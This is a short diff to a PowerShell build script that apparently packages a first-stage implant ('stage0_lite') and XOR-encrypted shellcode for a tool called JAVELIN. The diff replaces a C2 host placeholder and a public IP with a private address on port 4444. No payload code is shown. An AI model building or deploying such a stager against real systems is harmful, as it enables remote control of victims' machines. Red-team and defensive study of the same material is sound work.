@@ -7,8 +7,8 @@
 #   4.  Copy artefacts to dist/
 #
 # Usage:
-#   build.ps1 -Ip 45.154.98.72 -Port 4444
-#   build.ps1 -Ip 45.154.98.72 -Port 4444 -ApiPort 5555 -Production
+#   build.ps1 -Ip 192.168.2.7 -Port 4444
+#   build.ps1 -Ip 192.168.2.7 -Port 4444 -ApiPort 5555 -Production
 #
 # Output:
 #   dist\stage0_lite.exe          EXE (debug reference)
@@ -16,7 +16,7 @@
 #   dist\stage0_lite.bin.enc      XOR-encrypted shellcode (for JAVELIN)
 
 param(
-    [string]$Ip         = "CHANGEME_C2_HOST",
+    [string]$Ip         = "192.168.2.7",
     [int]   $Port       = 4444,
     [int]   $ApiPort    = 5555,
     [switch]$Production
